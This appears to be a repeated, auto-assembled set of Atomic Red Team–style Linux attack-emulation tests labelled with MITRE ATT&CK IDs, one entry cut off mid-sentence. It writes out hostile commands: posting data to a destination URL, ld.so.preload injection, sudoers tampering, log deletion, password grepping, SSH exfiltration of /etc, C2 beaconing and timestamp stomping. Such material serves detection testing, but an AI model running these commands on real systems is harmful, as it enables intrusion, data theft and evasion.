sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1153 ,T1040 ,T1135 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1153 ,T1081 ,T1083 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1154 ,T1139 ,T1018 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1153 ,T1040 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1168 ,T1064 ,T1081 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1136 ,T1154 ,T1040 ,T1135 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1168 ,T1153 ,T1040 ,T1201 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1158 ,T1064 ,T1040 ,T1083 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1153 ,T1081 ,T1069 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1064 ,T1040 ,T1083 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1154 ,T1081 ,T1201 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the
Test list contains:T1132 ,T1206 ,T1136 ,T1153 ,T1081 ,T1135 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1158 ,T1153 ,T1081 ,T1033 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1168 ,T1064 ,T1145 ,T1057 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
